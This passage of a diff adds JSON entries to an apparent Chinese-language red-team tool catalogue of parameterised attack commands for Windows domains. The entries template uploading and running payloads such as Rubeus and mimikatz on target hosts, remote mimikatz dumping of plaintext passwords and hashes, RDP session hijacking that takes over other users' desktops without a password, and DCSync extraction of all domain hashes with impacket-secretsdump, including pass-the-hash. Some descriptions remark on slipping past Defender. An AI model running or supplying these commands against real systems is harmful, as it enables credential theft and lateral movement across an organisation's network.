+          "l": "远程命令",
+          "req": 1
+        }
+      ],
+      "risk": "高",
+      "timeout": 120,
+      "danger": true
+    },
+    {
+      "id": "win-upload-run",
+      "stage": "阶段 3 横向",
+      "name": "Win Agent 传文件执行",
+      "desc": "win-run 变体:先上传本地 exe/ps1 到 C:\\Windows\\Temp 再执行,结果文件回读;投递 Rubeus/mimikatz/自定义 payload 的通用通道",
+      "cmd": "python3 ~/tools/bin/win-exec.py {{domuser}} {{pass}} {{target}} {{remoteargs}} {{file}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标FQDN",
+          "req": 1
+        },
+        {
+          "k": "domuser",
+          "l": "域/用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(-=用票)",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "remoteargs",
+          "l": "远文件名+参数",
+          "req": 1
+        },
+        {
+          "k": "file",
+          "l": "本地文件路径",
+          "req": 1
+        }
+      ],
+      "risk": "高",
+      "timeout": 120,
+      "danger": true
+    },
+    {
+      "id": "mimi-dump",
+      "stage": "阶段 5 收割",
+      "name": "mimikatz 远程收割",
+      "desc": "上传 Kali 自带 mimikatz.exe 远程 sekurlsa::logonpasswords 全量明文/哈希;需要管理员+杀软放行(Defender 会拦,先确认)",
+      "cmd": "python3 ~/tools/bin/win-exec.py {{domuser}} {{pass}} {{target}} 'C:\\Windows\\Temp\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit' /usr/share/windows-resources/mimikatz/x64/mimikatz.exe",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标FQDN",
+          "req": 1
+        },
+        {
+          "k": "domuser",
+          "l": "域/用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(-=用票)",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "risk": "高",
+      "timeout": 180,
+      "danger": true
+    },
+    {
+      "id": "rdp-hijack",
+      "stage": "阶段 3 横向",
+      "name": "RDP 会话劫持",
+      "desc": "query user 列会话 + tscon 接管(需 SYSTEM/目标机管理员,且目标有活动 RDP 会话): 无密码进他人桌面",
+      "cmd": "python3 ~/tools/bin/win-exec.py {{domuser}} {{pass}} {{target}} 'query user'",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标FQDN",
+          "req": 1
+        },
+        {
+          "k": "domuser",
+          "l": "域/用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(-=用票)",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "risk": "高",
+      "timeout": 120,
+      "danger": true
+    },
+    {
+      "id": "dcsync-all",
+      "stage": "阶段 4 提权",
+      "name": "DCSync 全域复制",
+      "desc": "DRSUAPI 全量拉域内所有用户哈希→自动收割入台账;Linux 侧完成,不碰目标 LSASS(Defender 无感)",
+      "cmd": "if [ -n '{{nthash}}' ]; then impacket-secretsdump -hashes :{{nthash}} '{{domain}}/{{user}}@{{dc}}'; else impacket-secretsdump '{{domain}}/{{user}}:{{pass}}@{{dc}}'; fi",
+      "params": [
+        {
+          "k": "domain",
+          "l": "凭据所属域",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户(EA/DA)",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(nthash 优先)",
+          "sens": 1
+        },
+        {
+          "k": "dc",
+          "l": "目标域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希(可空,PtH)"
+        }
+      ],
+      "risk": "高",
+      "timeout": 300,
+      "danger": true
+    }
+  ]
+}
